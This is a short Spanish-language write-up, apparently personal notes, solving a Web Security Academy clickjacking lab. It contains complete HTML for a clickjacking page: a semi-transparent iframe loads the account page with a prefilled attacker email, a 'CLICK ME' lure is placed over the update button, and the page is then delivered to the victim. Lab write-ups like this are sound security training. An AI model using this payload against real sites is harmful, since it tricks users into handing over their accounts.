## Objetivo:

![[Pasted image 20240609185445.png]]

## Solucion:

Iniciamos sesión con nuestra cuenta y una vez dentro vemos que mediante la url podemos cambiar el "value" del formulario para actualizar correo, en este caso seria el "email"

![[Pasted image 20240609185709.png]]

Una vez comprobado eso, crearemos un exploit con esta misma url para hacer nuestor "Clickjacking" ya que el objetivo de ésto es actualizar el correo, y esta es una manera de poder rellenar ese formulario sin que el usuario se dé cuenta...

El "exploit" se vería de la siguiente manera:

```
<!DOCTYPE html>

<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Document</title>

  

<style>

iframe {

width: 1000px;

height: 700px;

z-index: 2;

position: relative;

opacity: 0.3;

}

  

div {

position: absolute;

z-index: 2;

top: 465px;

left: 50px;

}

</style>

  

</head>

<body>

<div>CLICK ME</div>

<iframe src="https://0a1f00d503112dd98062f8960006006e.web-security-academy.net/my-account?email=pwned@gmail.com"></iframe>

</body>

</html>
```

Le damos a Store y nos aseguramos que quede el "CLICK ME" sobre el boton de actualizar email

![[Pasted image 20240609205341.png]]

Y una vez asegurado se lo enviamos a la victima

![[Pasted image 20240609205422.png]]

![[Pasted image 20240609205431.png]]

